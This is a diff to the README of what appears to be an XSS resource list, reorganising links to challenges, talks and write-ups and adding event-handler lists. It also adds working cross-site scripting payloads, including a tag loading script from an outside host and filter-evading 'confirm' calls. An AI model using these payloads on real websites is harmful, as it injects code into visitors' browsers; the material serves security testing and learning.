@@ -9,18 +9,20 @@ Put this repo on watch. I will be updating it regularly.
 - [brutelogic.com.br](http://brutelogic.com.br)
 - [respectxss.blogspot.in](https://respectxss.blogspot.in/)
 
+### Awesome Challenges
+- [Google's XSS Challenge](https://xss-game.appspot.com/)
+- [prompt(1) to win](http://prompt.ml/)
+
 ### Awesome People
 - [Rodolfo Assis](https://twitter.com/brutelogic)
 - [Ashar Javed](https://twitter.com/soaj1664ashar)
 - [Somdev Sangwan](https://twitter.com/s0md3v) because I made this repo :3
 
-### Awesome Reads
-- [XSS in Sarahah](http://www.shawarkhan.com/2017/08/sarahah-xss-exploitation-tool.html)
-- [XSS in Facebook via PNG Content Type](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
-
-### Awesome Presentations
+### Awesome Reads & Presentations
 - [How I met your girlfriend](https://www.youtube.com/watch?v=fWk_rMQiDGc)
 - [How to Find 1,352 Wordpress XSS Plugin Vulnerabilities in one hour](https://www.youtube.com/watch?v=9ADubsByGos)
+- [XSS in Sarahah](http://www.shawarkhan.com/2017/08/sarahah-xss-exploitation-tool.html)
+- [XSS in Facebook via PNG Content Type](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
 - [Blind XSS](https://www.youtube.com/watch?v=OT0fJEtz7aE)
 - [Copy Pest](https://www.slideshare.net/x00mario/copypest)
 
@@ -85,9 +87,10 @@ new class extends confirm``{}
 A good compilation of advanced XSS exploits can be found [here](http://www.xss-payloads.com/payloads-list.html?a#category=all)
 
 ### Awesome Tags & Event Handlers
-- [List of all Event Handlers](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
+- [105 Event Handlers with description](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
+- [200 Event Handlers without description](http://pastebin.com/raw/WwcBmz5J)
 
-Most used HTML Tags that you will be using
+Some HTML Tags that you will be using
 ```
 img
 svg
@@ -165,6 +168,7 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 ```
 - Without alert, confirm, prompt
 ```
+<script src=//14.rs></script>
 <svg onload=co\u006efirm()>
 <svg onload=z=co\u006efir\u006d,z()>
 ```
